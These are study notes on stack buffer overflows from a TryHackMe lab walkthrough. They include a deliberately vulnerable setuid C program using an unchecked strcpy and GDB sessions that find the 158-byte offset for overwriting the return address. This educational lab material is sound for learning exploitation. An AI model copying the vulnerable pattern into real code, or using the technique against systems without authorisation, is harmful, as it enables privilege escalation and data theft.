---
title: "Buffer Overflows"
---

:::note

Notes on everything buffer-overflow

:::

## The Stack 

The stack is the place in memory where your local variables and function arguments go.

Your application address space looks like this:

```sh
high addresses
  _____________
 [_____________]
 [    stack    ]
 [_____________]
 [             ]
 [             ]
 [_____________]
 [____heap_____]
 [___globals___]
 [____code_____]
 [_____________]

low addresses
```

The "heap" grows "upward", and the "stack" grows "downward"- so the "top" of the stack if you look at the diagram is technically the "bottom", cos it grows "downward".

### Stack Frame

:::info 

Reference [The Call Stack and Stack Overflows (example in C)](https://www.youtube.com/watch?v=jVzSBkbfdiw)

:::

Every time you call a function a chunk of memory is allocated to the "top" of the stack, this is called the `Stack Frame`, and holds the args, local variables and return address to jump back to, for that function call.

These Stack Frames are `PUSH` onto the stack:

e.g.

```sh 
main (locals, args, return)
printf(locals, args, return)
malloc(locals, args, return)
```

When the function "returns", the stack frame is removed with POP

|stack bottom|
|:-----------:|
|return address|
|saved registers|
|buffer: function|
|stack top|

### Stack Overflow 

To "overflow" we write more data to a memory space than allocated e.g. `char buffer[140]`, this causes memory addresses to be overwritten with whatever "extra" bytes flows over the size of the buffer.

> _no segfault_?

Segfault's happen when our program tries to overwrite memory space it does NOT own.

## x86 overflow using GDB

### Scenario

The scenario, is a buffer-overflow program belonging to `user1` will be used to read a `secret.txt` file belonging to `user2`:

```
[user1@ip-10-10-79-28 overflow-3]$ ll
total 24
-rwsrwxr-x 1 user2 user2 8264 Sep  2  2019 buffer-overflow
-rw-rw-r-- 1 user1 user1  285 Sep  2  2019 buffer-overflow.c
-rw------- 1 user2 user2   22 Sep  2  2019 secret.txt
```

Notes on an overflow using this program from TryHackMe [Buffer Overflow Room](https://tryhackme.com/room/bof1) task 8.

```c
#include <stdio.h>
#include <stdlib.h>

void copy_arg(char *string)
{
    char buffer[140];
    strcpy(buffer, string);
    printf("%s\n", buffer);
    return 0;
}

int main(int argc, char **argv)
{
    printf("Here's a program that echo's out your input\n");
    copy_arg(argv[1]);
}
```

this technique uses Python, GDB and a clear understanding of all elements of the Stack.

### Find the offset

use Python and GDB to find the offset i.e. number of bytes it takes to overwrite the return address.

```sh
(gdb) run $(python -c "print('A' * 150)")
Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print('A' * 150)")
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400595 in main ()

(gdb) run $(python -c "print('A' * 151)")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print('A' * 151)")
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGBUS, Bus error.
0x0000000000400595 in main ()

(gdb) run $(python -c "print('A' * 152)")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print('A' * 152)")
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGILL, Illegal instruction.
0x0000000000400500 in __do_global_dtors_aux ()

(gdb) run $(python -c "print('A' * 155)")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print('A' * 155)")
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000000000414141 in ?? ()
```

line `0x0000000000400595 in main ()` is the return address

what we're trying to do is overwrite it with until we see all `A`s i.e. `\x41` all over the return address like the following:

```
(gdb) run $(python -c "print('A' * 158)")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print('A' * 158)")
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000414141414141 in ?? ()

(gdb) run $(python -c "print('A' * 159)")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print('A' * 159)")
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400563 in copy_arg ()
```

you know you've gone OVER it when the return address goes from `41`s to some other bytes.

so, we now know  `158` bytes
